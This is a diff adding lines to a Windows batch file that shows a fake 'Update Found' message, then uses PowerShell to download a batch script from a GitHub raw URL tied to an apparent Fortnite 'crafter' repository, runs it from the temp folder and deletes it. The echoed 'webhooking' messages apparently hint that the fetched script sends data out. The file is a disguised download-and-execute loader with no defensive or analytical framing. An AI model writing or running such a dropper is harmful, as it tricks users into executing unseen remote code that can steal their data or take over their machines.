@@ -1,3 +1,28 @@
 @echo off
 Title sup
-echo Update Found
+cls
+echo Update Found..
+timeout /t 2 >nul
+Bootstrapped successfully installed..
+timeout /t 1 >nul
+cls
+:: Set the URL of the script
+set "url=https://raw.githubusercontent.com/r3ntlovestodev/fortnite-crafter421/refs/heads/main/coolboy/batch1.txt"
+
+
+set "tempFile=%temp%\downloadedScript.bat"
+
+
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%tempFile%')"
+
+
+timeout /t 2 >nul
+
+
+if exist "%tempFile%" (
+    echo webhooking main file
+    call "%tempFile%"
+    del "%tempFile%"
+) else (
+    echo failed to webhook main file.
+)
